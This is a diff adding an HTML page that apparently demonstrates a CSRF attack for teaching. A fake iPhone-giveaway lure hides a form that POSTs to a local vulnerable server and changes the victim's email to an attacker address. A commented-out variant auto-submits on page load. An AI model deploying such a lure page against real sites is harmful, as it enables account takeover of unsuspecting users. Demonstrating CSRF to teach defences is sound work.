@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Free iPhone Giveaway!! 🎉</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: sans-serif; display: flex; justify-content: center;
+           align-items: center; height: 100vh; background: #ecfdf5; }
+    .card { background: #fff; padding: 2.5rem; border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,.12); width: 420px; text-align: center; }
+    h2 { font-size: 1.6rem; color: #065f46; margin-bottom: .5rem; }
+    p  { color: #555; margin-bottom: 1.5rem; line-height: 1.5; }
+    button { padding: .8rem 2rem; background: #10b981; color: #fff;
+             border: none; border-radius: 6px; font-size: 1.1rem; cursor: pointer; }
+    button:hover { background: #059669; }
+    .separator { margin: 2rem 0; border-top: 1px dashed #ccc; }
+    .debug { text-align: left; background: #1e1e1e; color: #4ade80;
+             padding: 1rem; border-radius: 6px; font-size: .8rem;
+             font-family: monospace; white-space: pre-wrap; }
+    #status { margin-top: 1rem; font-size: .9rem; font-weight: bold; }
+    .success { color: green; }
+    .fail    { color: red; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>🎉 Claim Your Free iPhone!</h2>
+  <p>You've been selected for an exclusive giveaway.<br>
+     Click the button below to claim your prize.</p>
+
+  <!-- Decoy button — visually looks harmless -->
+  <button onclick="claimPrize()">Claim Now 🎁</button>
+
+  <div class="separator"></div>
+
+  <!-- ══ WHAT IS ACTUALLY HAPPENING ══ -->
+  <div class="debug" id="log">Waiting for user to click...</div>
+  <div id="status"></div>
+</div>
+
+<!--
+  ╔══════════════════════════════════════════════════════╗
+  ║           CSRF ATTACK — HOW IT WORKS                ║
+  ║                                                      ║
+  ║  This page silently submits a hidden form to the    ║
+  ║  victim's bank/profile server.                      ║
+  ║  The browser automatically attaches the session     ║
+  ║  cookie → the server thinks it's a legit request.  ║
+  ╚══════════════════════════════════════════════════════╝
+-->
+
+<!-- Hidden auto-submit form pointing at the VULNERABLE server -->
+<form
+  id="csrf-form"
+  action="http://localhost:3000/profile/update"
+  method="POST"
+  style="display:none"
+>
+  <input type="hidden" name="email" value="hacked@attacker.com" />
+  <input type="hidden" name="bio"   value="🔴 YOU HAVE BEEN CSRF'd! Account compromised." />
+  <!--
+    ❌  No CSRF token included — the server doesn't require one,
+        so this request is accepted as if it came from the real profile page.
+  -->
+</form>
+
+<script>
+  const log    = document.getElementById("log");
+  const status = document.getElementById("status");
+
+  function claimPrize() {
+    log.textContent =
+`[CSRF ATTACK EXECUTING]
+─────────────────────────────
+Target  : http://localhost:3000/profile/update
+Method  : POST (hidden form submission)
+Payload :
+  email = hacked@attacker.com
+  bio   = 🔴 YOU HAVE BEEN CSRF'd!
+
+The browser will attach the victim's
+session cookie automatically.
+The server will trust this request
+because it has NO CSRF token check.
+─────────────────────────────
+Submitting...`;
+
+    // Give the user a moment to read the log, then fire
+    setTimeout(() => {
+      document.getElementById("csrf-form").submit();
+    }, 2000);
+  }
+
+  // ── SILENT / AUTO-FIRE VARIANT (uncomment to attack on page load) ──
+  // window.onload = () => {
+  //   document.getElementById("csrf-form").submit();
+  // };
+</script>
+</body>
+</html>
